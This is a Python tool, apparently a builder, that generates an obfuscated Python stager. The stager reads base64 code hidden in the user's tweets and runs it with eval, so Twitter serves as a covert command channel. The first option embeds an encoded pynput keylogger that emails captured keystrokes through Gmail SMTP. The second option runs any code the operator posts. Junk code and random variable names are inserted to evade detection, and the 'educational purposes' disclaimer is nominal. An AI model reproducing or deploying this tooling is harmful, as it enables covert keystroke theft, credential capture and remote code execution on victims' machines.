#Python3.7.4 / Coded by Lukas de Antueno
import random,string,base64,requests
from io import open
string.ascii_letters
banner=r"""
__ __|                   |         ___|             |       
   |\ \ \   /  _ \   _ \  __|      |       _ \    _` |   _ \ 
   | \ \ \ /   __/   __/  |        |      (   |  (   |   __/ 
  _|  \_/\_/ \___| \___| \__|     \____| \___/  \__,_| \___| 

      .---.        .-----------
     /     \  __  /    ------
    / /     \(..)/    -----       Coded by: Lukas de Antueno
   //////   ' \/ `   ---	 
  //// / // :    : ---		  YouTube: https://www.youtube.com/channel/UCodG8tie7EWSGhoshtaGplg
 // /   /  /`    '--		 
//          //..\\		  Email: lukasdaviddeantuenoisrael@gmail.com
       ====UU====UU====                                        
"""
print(banner)
print("")
print("The usage of this tool for attacking targets without previous mutual consent is illegal.")
print("Only use for educational purposes.")
codigoDefault=r"ZXhlYygiIiJcbmltcG9ydCByZXF1ZXN0cyxiYXNlNjQsc3RyaW5nXG51cmw9Imh0dHBzOi8vdHdpdHRlci5jb20vbHVrYXMzMDc2MzUwNiJcbnJlc3BvbnNlPXJlcXVlc3RzLmdldCh1cmwpXG5pZiByZXNwb25zZS5zdGF0dXNfY29kZT09MjAwOlxuCWNvbnRlbnQ9cmVzcG9uc2UudGV4dFxuCWNvbnRhZG9yPTFcbgljb250ZW5pZG89IiJcbglmb3IgaSBpbiBjb250ZW50OlxuCQlpZiBjb250YWRvcj49MzpcbgkJCWlmIGk9PSIkIjpcbgkJCQljb250YWRvcj1jb250YWRvcisxXG4JCQkJaWYgY29udGFkb3I9PTY6XG4JCQkJCWNvbnRhZG9yPTBcbgkJCWVsaWYgaSE9IiQiOlxuCQkJCWNvbnRlbmlkbz1jb250ZW5pZG8raVxuCQllbGlmIGk9PSIkIjpcbgkJCWNvbnRhZG9yPWNvbnRhZG9yKzFcbgkJZWxzZTpcbgkJCWNvbnRhZG9yPTBcbmRlZiBkZXNlbmNvZGVhcihzZWxmKTpcbglkZXNjb2RlYWRvPXNlbGZcbgljb250aW51YXI9MFxuCWxpc3RvPSIiXG4JZm9yIGkgaW4gZGVzY29kZWFkbzpcbgkJaWYgY29udGludWFyPT0xOlxuCQkJcGFzc1xuCQkJY29udGludWFyPTBcbgkJZWxzZTpcbgkJCWxpc3RvPWxpc3RvK2lcbgkJCWNvbnRpbnVhcj0xXG4JbGlzdG89bGlzdG8uZW5jb2RlKCd1dGYtOCcpXG4JbGlzdG89YmFzZTY0LmI2NGRlY29kZShsaXN0bylcbglsaXN0bz1saXN0by5kZWNvZGUoInV0Zi04IilcbglsaXN0bz1saXN0b1s6Oi0xXQlcbglldmFsKGxpc3RvKVxuZGVzZW5jb2RlYXIoY29udGVuaWRvKVxuIiIiKQ=="
print("-")
print(" ")
print("Please enter the URL of your twitter")
URL=input()
texto=""
codigoDefault=base64.b64decode(codigoDefault)
codigoDefault=codigoDefault.decode("utf-8")
NumeroC=0
codigoNew=""
mURL=False
ListaDeNombres=[]
class Nombres():
	nombre=""
	def AsignarNombre(self):
		caracter=random.randint(7,8)
		contador=1
		nombre1=""
		while True:
			while contador<caracter:
				valor=random.randint(1,2)
				if valor==1 or contador==1:
					letra=random.choice(string.ascii_letters)
					nombre1=nombre1+letra
				else:
						letra=random.randint(1,9)
						letra=str(letra)
						nombre1=nombre1+letra
				contador=contador+1
			if nombre1 in ListaDeNombres:
				pass
			else:
				ListaDeNombres.append(nombre1)
				self.nombre=nombre1
				break;
def aleatoriedad():
	aleatorio=random.randint(1,2)
	if aleatorio==1:
		NumOperacion1=random.randint(1,100)
		NumOperacion2=random.randint(1,100)
		randomItemV1=Nombres()
		randomItemV1.AsignarNombre()
		operacion=random.randint(1,3)
		if operacion==1:
			operacion="-"
		elif operacion==2:
			operacion="+"
		else:
			operacion="%"
		agregadoRandom=(str(randomItemV1.nombre)+"="+str(NumOperacion1)+str(operacion)+str(NumOperacion2)+"\n")

	elif aleatorio==2:
		nombrerandomV1=Nombres()
		nombrerandomV1.AsignarNombre()
		cr=random.randint(1,3)
		if cr==1:
			valorR1="True"
			valorRV1="False"
		elif cr==2:
			valorR1="False"
			valorRV1="True"
		else:
			valorR1=random.randint(1,100)
		valorR2=random.randint(1,100)
		valorR3=random.randint(1,100)
		valorR4=valorR2+valorR3
		valorRV1=random.randint(101,200)

		variabl1=(str(nombrerandomV1.nombre)+"="+str(valorR1)+"\n")
		variabl2=("while "+str(nombrerandomV1.nombre)+"=="+str(valorR1)+":\n")
		variabl3=("	if "+str(valorR2)+"+"+str(valorR3)+"=="+str(valorR4)+":\n")
		cr=random.randint(1,2)
		if cr==1:
			variabl4=("		break;\n")
		else:
			variabl4=("		"+str(nombrerandomV1.nombre)+"="+str(valorRV1)+"\n")
		variabl5=("	else:\n")
		cr=random.randint(1,2)
		if cr==1:
			variabl6=("		pass\n")
		else:
			nombrerandomV2=Nombres()
			nombrerandomV2.AsignarNombre()
			NumO1=random.randint(1,100)
			NumO2=random.randint(1,100)
			NumO3=random.randint(1,100)
			NumO4=random.randint(1,100)
			cr=random.randint(1,3)
			if cr==1:
				variabl6=("		"+str(nombrerandomV2.nombre)+"="+str(NumO1)+"+"+str(NumO2)+"\n")
			elif cr==2:
				variabl6=("		"+str(nombrerandomV2.nombre)+"="+str(NumO1)+"+"+str(NumO2)+"+"+str(NumO3)+"\n")
			else:
				variabl6=("		"+str(nombrerandomV2.nombre)+"="+str(NumO1)+"+"+str(NumO2)+"+"+str(NumO3)+"+"+str(NumO4)+"\n")
		cr=random.randint(1,2)
		if cr==1:
			agregadoRandom=[variabl1,variabl2,variabl3,variabl4,variabl5,variabl6]
		else:
			agregadoRandom=[variabl1,variabl2,variabl3,variabl4]
	elif aleatorio==3:
		nombreRandomV1=Nombres()
		nombreRandomV1.AsignarNombre()
		nombreRandomV2=Nombres()
		nombreRandomV2.AsignarNombre()
		nombreRandomV3=Nombres()
		nombreRandomV3.AsignarNombre()
		cr=random.choice(string.ascii_letters)
		valorR=random.randint(1,3)
		if valorR==1:
			vr="True"
		elif valorR==2:
			vr="False"
		else:
			vr=random.randint(1,100)
		variabl1=(str(nombreRandomV1.nombre)+'="'+str(nombreRandomV3.nombre)+'"')
		variabl2=("for i in "+str(nombreRandomV1.nombre)+":")
		variabl3=('	if i=="'+str(cr)+'":')
		variabl4=("		"+str(nombreRandomV2.nombre)+"="+str(vr))		
		agregadoRandom=[variabl1,variabl2,variabl3,variabl4]
	vr=random.randint(0,7)
	elementoSelec=(ListaCodigoB[vr])
	contadorV=0
	for i in ListaCodigo:
		if i==elementoSelec:
			break;
		contadorV=contadorV+1
	ListaCodigo.insert(contadorV, agregadoRandom)
	

nombreV1=Nombres()
nombreV1.AsignarNombre()
nombreV2=Nombres()
nombreV2.AsignarNombre()


librerias1=["base64", "string", "random","requests"]

rv=random.randint(0,3)
varL=(librerias1[rv])
libreriasV=("import "+str(varL))
librerias1.remove(varL)

rv=random.randint(0,2)
varL=(librerias1[rv])
libreriasV=(libreriasV+","+str(varL))
librerias1.remove(varL)

rv=random.randint(0,1)
varL=(librerias1[rv])
libreriasV=(libreriasV+","+str(varL))
librerias1.remove(varL)

varL=(librerias1[0])
libreriasV=(libreriasV+","+str(varL)+"\n")
librerias1.remove(varL)


nombreLA1=(nombreV2.nombre+"="+nombreV1.nombre+"[::-1]\n")
nombreLA2=("for i in "+nombreV2.nombre+":\n")

nombreV3=Nombres()
nombreV3.AsignarNombre()

nombreLB1=(nombreV3.nombre+'=""\n')
nombreLB2=("		"+nombreV3.nombre+"="+nombreV3.nombre+"+i\n")
nombreLB3=(nombreV3.nombre+"="+nombreV3.nombre+".encode('utf-8')\n")
nombreLB4=(nombreV3.nombre+"=base64.b64decode("+nombreV3.nombre+")\n")
nombreLB5=(nombreV3.nombre+"="+nombreV3.nombre+'.decode("utf-8")\n')
nombreLB6=("eval("+nombreV3.nombre+")\n")
nombreV4=Nombres()
nombreV4.AsignarNombre()
	
nombreLC1=(nombreV4.nombre+"=1\n")
nombreLC2=("	if "+nombreV4.nombre+"==1:\n")
nombreLC3=("		"+nombreV4.nombre+"=0\n")
nombreLC4=("		"+nombreV4.nombre+"=1\n")

ListaLlave=[nombreLA2,nombreLC2,nombreLC3,"	else:\n",nombreLB2,nombreLC4]

vr=random.randint(1,2)
CodeadoV2=False
if vr==1:
	nombrV1=Nombres()
	nombrV1.AsignarNombre()
	Linea1=(str(nombrV1.nombre)+"=0\n")
	nombrV2=Nombres()
	nombrV2.AsignarNombre()
	nombrV3Lista=Nombres()
	nombrV3Lista.AsignarNombre()
	nombrV4Texto=Nombres()
	nombrV4Texto.AsignarNombre()	
	Linea3=("for i in "+str(nombreV2.nombre)+":\n")
	Linea4=("	"+str(nombrV1.nombre)+"="+str(nombrV1.nombre)+"+1\n")
	Linea5=("	if "+str(nombrV1.nombre)+" in "+str(nombrV3Lista.nombre)+":\n")
	Linea6=("		pass\n")
	Linea7=("	else:\n")
	Linea8=("		"+str(nombreV3.nombre)+"="+str(nombreV3.nombre)+"+i\n")
	ListaLlave=[Linea1,Linea3,Linea4,Linea5,Linea6,Linea7,Linea8]
	CodeadoV2=True


nombreV5=Nombres()
nombreV5.AsignarNombre()
ListaCodigo=[libreriasV,texto,nombreLA1,nombreLB1,nombreLC1,ListaLlave,nombreLB3,nombreLB4,nombreLB5,nombreLB6]

ListaCodigoB=[nombreLA1,nombreLB1,nombreLC1,ListaLlave,nombreLB3,nombreLB4,nombreLB5,nombreLB6]

aleatorioA=random.randint(5,10)
contadorA=0
while contadorA<aleatorioA:
	aleatoriedad()
	contadorA=contadorA+1

for i in codigoDefault:
	if NumeroC==4:
		if mURL==False:
			codigoNew=codigoNew+URL
			mURL=True
			
		if i=='"':
			NumeroC=NumeroC+1
			codigoNew=codigoNew+i
		
	else:
		if i=='"':
			NumeroC=NumeroC+1
		codigoNew=codigoNew+i
codigoDefault=codigoNew.encode("utf-8")
codigoDefault=base64.b64encode(codigoDefault)
codigoDefault=codigoDefault.decode("utf-8")
caracter=random.randint(5,8)
contador=1
nombre=""
while contador<caracter:
	valor=random.randint(1,2)
	if valor==1:
		letra=random.choice(string.ascii_letters)
		nombre=nombre+letra
	else:		
			letra=random.randint(1,9)
			letra=str(letra)
			nombre=nombre+letra
	contador=contador+1
nombre=(nombre+".py")
def encodear1(self):
	nombre1=nombre
	codeado=self[::-1]
	print("-------------")
	texto=""
	conteo=0
	for i in codeado:
		letra=random.choice(string.ascii_letters)
		texto=str(texto)+str(i)+str(letra)
	texto=(nombreV1.nombre+'="'+texto+'"\n')
	file=open(nombre, 'w')
	for i in ListaCodigo:
		conteo=conteo+1
		if conteo==2:
			file.write(texto)
		elif type(i)==list:
			for x in i:
				file.write(x)
		else:
			file.write(i)
	file.close()
	print("The file "+str(nombre)+ " was created")
	print(" ")
ListaDeNumeros=[]



def encodear2(self):
	nombre1=nombre
	codeado=self
	print("-------------")
	texto=""
	conteo=0
	conteo2=0
	conteo3=0
	for i in codeado:
		rv=random.randint(1,2)
		if rv==1:
			letra=random.choice(string.ascii_letters)
			texto=str(texto)+str(i)+str(letra)
			conteo2=conteo2+2
			ListaDeNumeros.append(conteo2)
		else:
			texto=str(texto)+str(i)
			conteo2=conteo2+1
	lista=(str(nombrV3Lista.nombre)+"=[")
	largo=len(ListaDeNumeros)
	for i in ListaDeNumeros:
		conteo3=conteo3+1
		if conteo3==largo:
			lista=(lista+str(i)+"]\n")
		else:
			lista=lista+str(i)+","
	texto=texto[::-1]		
	texto=(str(nombreV1.nombre)+'="'+texto+'"\n')
	file=open(nombre, 'w')
	for i in ListaCodigo:
		conteo=conteo+1
		if conteo==2:
			file.write(texto)
			file.write(lista)
		elif type(i)==list:
			for x in i:
				file.write(x)
		else:
			file.write(i)
	file.close()
	print("The file "+str(nombre)+ " was created")
	print(" ")


if CodeadoV2==True:
	encodear2(codigoDefault)
else:
	encodear1(codigoDefault)

def DefinirTweets(self):
	TweetCodigo=""
	ListaTweets=[]
	codigo=self
	codigo=codigo[::-1]
	codigo=codigo.encode('utf-8')
	codigo=base64.b64encode(codigo)
	codigo=codigo.decode("utf-8")
	for i in codigo:
		letra=random.choice(string.ascii_letters)
		TweetCodigo=TweetCodigo+i+letra
	numerocaracteres=len(TweetCodigo)
	contador=0
	contadorC=0
	print("____________________________________________________")
	print("YOU SHOULD DELETE YOUR TWEETS BEFORE POSTING THIS")
	print("____________________________________________________")
	for i in TweetCodigo:
		contador=contador+1
		contadorC=contadorC+1
		if contador==1:
			Tweet="$$$"+i
		elif contador==274 or numerocaracteres==contadorC:
			Tweet=Tweet+i+"$$$"
			ListaTweets.append(Tweet)
			Tweet=""
			contador=0
		else:
			Tweet=Tweet+i
	contador=0
	for i in ListaTweets[::-1]:
		contador=contador+1
		print("Tweet"+str(contador)+":")
		print(i)
		print("-------------------")

def Armar2():
	print("Source Email:")
	SourceEmail=input()
	print("password:")
	Spassword=input()
	print("Destination Email:")
	DestEmail=input()
	codigoEnLista=["ZXhlYygiIiJcbnRleHQ9IiJcbmNvbnRhZG9yPTBcbmxpc3RhPVtdXG5lbnZpYXI9RmFsc2VcbmRlZiBlbnZpYXJFKCk6XG4JZ2xvYmFsIGVudmlhclxuCXdoaWxlIFRydWU6XG4JCWlmIGNvbnRhZG9yPj0yNTAgYW5kIGVudmlhcj09VHJ1ZTpcbgkJCWVudmlhcj1GYWxzZVxuCQkJZnJvbWFkZHIgPSAn", SourceEmail,"J1xuCQkJdG9hZGRycyAgPSAn",DestEmail,"J1xuCQkJbWVucz1saXN0YVswXVxuCQkJbXNnID0gbWVuc1xuCQkJdXNlcm5hbWUgPSAn",SourceEmail,"J1xuCQkJcGFzc3dvcmQgPSAn",Spassword,"J1xuCQkJc2VydmVyID0gc210cGxpYi5TTVRQKCdzbXRwLmdtYWlsLmNvbTo1ODcnKVxuCQkJc2VydmVyLnN0YXJ0dGxzKClcbgkJCXNlcnZlci5sb2dpbih1c2VybmFtZSxwYXNzd29yZClcbgkJCXNlcnZlci5zZW5kbWFpbChmcm9tYWRkciwgdG9hZGRycywgbXNnKVxuCQkJc2VydmVyLnF1aXQoKVxuCQl0aW1lLnNsZWVwKDEpXG5cbmRlZiBtb25pdG9yKGtleSk6XG4JZ2xvYmFsIHRleHRcbglnbG9iYWwgY29udGFkb3JcbglnbG9iYWwgbGlzdGFcbglnbG9iYWwgZW52aWFyXG4JdHJ5OlxuCQl0ZXh0PSh0ZXh0K3N0cihrZXkuY2hhcikpXG4JCVxuCWV4Y2VwdDpcbgkJdmFyaWFibGVUPSgiKCIrc3RyKGtleSkrIikiKVxuCQl0ZXh0PSh0ZXh0K3N0cih2YXJpYWJsZVQpKVxuCWNvbnRhZG9yPWNvbnRhZG9yKzFcbglpZiBjb250YWRvcj09MjUwOlxuCQllbnZpYXI9VHJ1ZVxuCQlsaXN0YT1bXVxuCQlsaXN0YS5hcHBlbmQodGV4dClcbgkJdGV4dD0iIlxuCWlmIGNvbnRhZG9yPT0yNjA6XG4JCWNvbnRhZG9yPTEwXG50MT10aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1lbnZpYXJFKVxudDEuc3RhcnQoKVxud2l0aCBMaXN0ZW5lcihvbl9yZWxlYXNlPW1vbml0b3IpIGFzIGxpc3RlbmVyOlxuCWxpc3RlbmVyLmpvaW4oKVxuIiIiKQ=="]
	codigobd=""
	listanumeros=[1,3,5,7]
	contador=-1
	for i in codigoEnLista:
		contador=contador+1
		if contador in listanumeros:
			codigobd=codigobd+i
		else:
			i = i.encode('utf-8')
			i = base64.b64decode(i)
			i = i.decode("utf-8")
			codigobd=codigobd+i
	DefinirTweets(codigobd)


print("OPTIONS:")
print("(1) DefaultKeyLogger")
print("(2) Execute your own code")

while True:
	opcionselec=input()
	if opcionselec=="1":
		print("WARNING: Do not use a personal email/password | the credentials will be posted in your twitter")
		print("Change the password after using this tool and delete the Email/twitter accounts")
		print("_")
		archivo_texto = open(nombre, "r")
		lista_archivo = (archivo_texto.readlines())
		contador=len(lista_archivo)
		lista_archivo.insert(0, "from pynput.keyboard import Listener, Key\n")
		lista_archivo.insert(0, "import threading,time,smtplib\n")
		archivo_texto.close() 
		archivo_texto = open(nombre, "w")
		archivo_texto.writelines(lista_archivo)
		archivo_texto.close()
		Armar2()
		exit()
	elif opcionselec=="2":
		print("if you want to use libraries, you have yo import them inside the file created")
		print('You can search in google: "Python3 single line converter"')
		while True:
			print("Please enter your code in a single line")
			codigobd=input()
			print("_")
			DefinirTweets(codigobd)
		
	else:
		print("please enter a number (1 or 2")
